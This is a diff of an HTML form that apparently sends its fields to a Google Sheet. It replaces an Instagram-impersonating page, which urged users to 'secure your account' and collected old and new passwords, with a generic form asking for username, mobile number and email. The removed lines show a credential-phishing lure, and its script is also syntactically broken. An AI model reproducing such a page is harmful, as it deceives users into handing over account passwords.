@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>User Details </title>
+<title>User Details Form</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
@@ -46,7 +46,7 @@
   .mobile-wrap .code {
     width: 64px; text-align: center; background: #eef1f5; color: #3c4356; font-weight: 600;
   }
-  .mobile-wrap input[type=""] { flex: 1; }
+  .mobile-wrap input[type="tel"] { flex: 1; }
   button {
     width: 100%;
     padding: 12px;
@@ -91,14 +91,14 @@
     <div class="brand">
       <!-- Logo: ye ek simple sa nishan hai. Apna logo lagana ho to
            is <svg> ki jagah <img src="logo.png"> daal dena. -->
-      <svg class="logo" viewBox="0 0 24 24" width="64" height="64" fill="none" stroke="#1f4e79" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
-    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
-    <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
-</svg>
-      <h1>Welcome to instagram </h1>
+      <svg class="logo" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+        <rect x="2" y="2" width="60" height="60" rx="14" fill="#1f4e79"/>
+        <circle cx="32" cy="25" r="9" fill="#ffffff"/>
+        <path d="M14 52c2.5-9 9.5-13 18-13s15.5 4 18 13" fill="#ffffff"/>
+      </svg>
+      <h1>Welcome to Site</h1>
     </div>
-    <p class="sub">secure your account immediatly</p>
+    <p class="sub">Please fill in your details below.</p>
 
     <div class="error" id="errorBox"></div>
 
@@ -106,14 +106,11 @@
       <label for="username">Username</label>
       <input type="text" id="username" placeholder="Enter your username" autocomplete="off">
 
-      <label for="password">old password</label>
-      <div class="mobile-wrap">
-        <input type="text" class="code" value="" readonly tabindex="-1">
-        <input type="text" id="password" placeholder="old password" maxlength="25">
-      </div>
+      <label for="mobile">Mobile Number</label>
+      <input type="text" id="mobile" placeholder="Enter your mobile number" autocomplete="off">
 
-      <label for="password">new password</label>
-      <input type="email" id="email" placeholder="new password" autocomplete="off">
+      <label for="email">Email Address</label>
+      <input type="text" id="email" placeholder="Enter your email address" autocomplete="off">
 
       <button type="submit" id="submitBtn">Submit</button>
     </form>
@@ -123,9 +120,9 @@
   <div class="card hidden" id="confirmView">
     <div class="confirm">
       <div class="tick">&#10003;</div>
-      <h2>safe &mdash; now your account is safe .</h2>
-      <p>your account is safe now.</p>
-      <button type="button" id="againBtn">back to home screen</button>
+      <h2>Good &mdash; your response is saved.</h2>
+      <p>Thank you. Your details have been recorded successfully.</p>
+      <button type="button" id="againBtn">Submit another response</button>
     </div>
   </div>
 
@@ -153,20 +150,21 @@
     hideError();
 
     var username = document.getElementById("username").value.trim();
-    var password  = document.getElementById("password").value.trim();
-    var password    = document.getElementById("password").value.trim();
+    var mobile   = document.getElementById("mobile").value.trim();
+    var email    = document.getElementById("email").value.trim();
 
-    // ---- Validation ----
-    if (username.length < 3) {
-      showError("Please enter a valid username (at least 3 characters).");
+    // ---- Validation: sirf khaali hona check hota hai.
+    // Har input me text, number aur symbol — sab chalta hai. ----
+    if (username.length === 0) {
+      showError("Please enter your username.");
       return;
-    }if (mobile.length === 0) {
-  showError("Please enter your mobile number.");
-  return;
-
     }
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-      showError("Please enter a valid email address.");
+    if (mobile.length === 0) {
+      showError("Please enter your mobile number.");
+      return;
+    }
+    if (email.length === 0) {
+      showError("Please enter your email address.");
       return;
     }
     if (SCRIPT_URL === "YAHAN_APNA_APPS_SCRIPT_URL_DAALO") {
@@ -180,8 +178,8 @@
     // ---- Data Google Sheet ko bhejna ----
     var data = new FormData();
     data.append("username", username);
-    data.append("password", old);
-    data.append("password", new password);
+    data.append("mobile", mobile);
+    data.append("email", email);
 
     fetch(SCRIPT_URL, { method: "POST", body: data })
       .then(function () {
